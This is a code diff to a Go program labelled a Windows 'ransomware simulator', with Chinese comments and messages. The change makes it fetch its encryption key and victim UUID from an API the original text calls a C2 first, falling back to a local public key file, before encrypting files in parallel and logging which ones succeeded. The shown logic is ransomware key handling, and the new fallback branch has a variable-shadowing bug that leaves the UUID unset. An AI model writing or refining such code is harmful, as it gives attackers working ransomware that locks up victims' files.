@@ -1,4 +1,4 @@
-// ransom_simulator_windows.go - Windows专用版本（增强版）带日志功能和本地密钥支持
+// ransom_simulator_windows.go - Windows专用版本（增强版）带日志功能 - API优先获取密钥，失败回退本地密钥
 package main
 
 import (
@@ -238,7 +238,7 @@ func main() {
 	forceReleaseLock()
 
 	fmt.Println("==================================================")
-	fmt.Println("      勒索软件模拟器 - Windows增强版")
+	fmt.Println("      勒索软件模拟器 - Windows增强版（API优先+本地回退）")
 	fmt.Printf("                版本: %s\n", version)
 	fmt.Println("==================================================")
 	time.Sleep(1 * time.Second)
@@ -847,10 +847,10 @@ func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool, *bool) 
 
 	fs.Usage = func() {
 		_, _ = fmt.Fprintf(os.Stderr, "用法: %s [flags]\n", os.Args[0])
-		_, _ = fmt.Fprintf(os.Stderr, "本地密钥模式: 程序仅从同目录读取密钥文件\n")
-		_, _ = fmt.Fprintf(os.Stderr, "必需文件:\n")
+		_, _ = fmt.Fprintf(os.Stderr, "密钥获取优先级: 1) API接口获取 2) 本地公钥文件\n")
+		_, _ = fmt.Fprintf(os.Stderr, "本地公钥文件格式:\n")
 		_, _ = fmt.Fprintf(os.Stderr, "  - public_key_<uuid>.pem: 公钥文件，例如 public_key_5137d4c3-3901-4528-bfa9-6d9ce88fa287.pem\n")
-		_, _ = fmt.Fprintf(os.Stderr, "注意: UUID将从公钥文件名中自动提取\n")
+		_, _ = fmt.Fprintf(os.Stderr, "注意: 当API不可用时，UUID将从公钥文件名中自动提取\n")
 		_, _ = fmt.Fprintf(os.Stderr, "日志文件将输出到程序所在目录:\n")
 		_, _ = fmt.Fprintf(os.Stderr, "  - success_encrypted.log: 成功加密的文件列表\n")
 		_, _ = fmt.Fprintf(os.Stderr, "  - failed_encrypted.log:  加密失败的文件列表\n")
@@ -1027,29 +1027,25 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 	jobs := make(chan string, len(files))
 	var wg sync.WaitGroup
 
-	// 尝试从公钥文件名中提取UUID
-	fmt.Print("[*] 尝试从公钥文件名提取UUID... ")
-	uuid, err := extractUUIDFromFilename()
+	// 优先尝试从API获取密钥
+	var uuid string
+	fmt.Print("[*] 尝试从API获取密钥... ")
+	resp, err := fetchKeysFromAPI()
 	if err != nil {
 		fmt.Printf("失败: %v\n", err)
-		fmt.Println("[*] 尝试从网络获取密钥...")
+		fmt.Println("[*] API获取失败，回退到本地密钥...")
 
-		// 尝试从网络获取
-		resp, err2 := fetchKeysFromAPI()
+		// 回退：尝试从公钥文件名中提取UUID
+		uuid, err2 := extractUUIDFromFilename()
 		if err2 != nil {
-			fmt.Printf("[!] 连接C2获取密钥失败: %v\n", err2)
+			fmt.Printf("失败: %v\n", err2)
 			fmt.Println("[!] 无法获取密钥，程序终止")
 			os.Exit(1)
 		}
-		uuid = resp.UUID
-		publicKeyPEM = resp.PublicKeyPEM
-		fmt.Printf("[*] 从网络获取UUID: %s\n", uuid)
-	} else {
 		fmt.Printf("成功: %s\n", uuid)
 
 		// 从本地文件读取公钥
 		fmt.Print("[*] 从本地文件读取公钥... ")
-		var err2 error
 		publicKeyPEM, err2 = readPublicKeyFromFile(uuid)
 		if err2 != nil {
 			fmt.Printf("失败: %v\n", err2)
@@ -1057,6 +1053,10 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 			os.Exit(1)
 		}
 		fmt.Println("成功")
+	} else {
+		uuid = resp.UUID
+		publicKeyPEM = resp.PublicKeyPEM
+		fmt.Printf("成功，UUID: %s\n", uuid)
 	}
 
 	// 预解析公钥，确保格式正确
